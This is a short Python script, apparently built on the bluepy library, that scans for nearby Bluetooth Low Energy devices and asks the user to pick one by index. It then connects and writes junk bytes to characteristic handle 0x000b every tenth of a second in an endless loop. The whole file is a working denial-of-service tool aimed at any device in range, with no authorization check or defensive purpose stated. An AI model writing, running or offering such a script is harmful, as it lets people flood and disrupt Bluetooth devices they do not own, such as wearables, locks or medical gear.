import sys
import time
from bluepy.btle import Scanner, Peripheral, BTLEException

def scan_devices():
    print("[*] Scanning for BLE devices...")
    scanner = Scanner()
    devices = scanner.scan(10.0)  # Scan for 10 seconds

    for idx, device in enumerate(devices):
        print(f"{idx}: {device.addr} ({device.addrType}), RSSI={device.rssi} dB")

    return devices

def spam_ble_device(device_addr):
    print(f"[*] Attempting to connect to {device_addr}")
    try:
        peripheral = Peripheral(device_addr)
        print("[*] Connected! Spamming data...")
        
        # Loop to continuously send junk data
        while True:
            try:
                # Sending junk data to handle 0x000b (you may need to adjust this handle)
                junk_data = b'\x00\xFF' * 50
                peripheral.writeCharacteristic(0x000b, junk_data, withResponse=False)
                print(f"[*] Sent spam to {device_addr}")
                time.sleep(0.1)  # Adjust the speed as needed
            except BTLEException as e:
                print(f"[!] Error: {e}")
                break

    except BTLEException as e:
        print(f"[!] Failed to connect to {device_addr}: {e}")
    finally:
        print("[*] Disconnecting...")
        try:
            peripheral.disconnect()
        except:
            pass

def main():
    devices = scan_devices()

    if not devices:
        print("[!] No BLE devices found.")
        sys.exit(1)

    device_idx = input("[*] Enter the index of the device to spam: ")
    try:
        device_idx = int(device_idx)
        target_device = devices[device_idx].addr
    except (ValueError, IndexError):
        print("[!] Invalid index.")
        sys.exit(1)

    spam_ble_device(target_device)

if __name__ == "__main__":
    main()
